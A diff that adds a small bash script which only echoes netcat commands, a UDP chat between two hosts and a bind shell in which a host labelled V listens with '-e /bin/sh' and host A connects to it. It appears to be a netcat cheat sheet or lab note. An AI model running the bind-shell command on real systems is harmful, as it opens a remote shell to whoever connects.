@@ -1,0 +1,7 @@
+#!/bin/bash
+
+echo "A~$ nc -nvulp 12345"
+echo "B~$ nc -nvu <A-ip> 12345"
+echo ""
+echo "V~$ nc -nvulp 12345 -e /bin/sh" 
+echo "A~$ nc -nvu <V-ip> 12345"
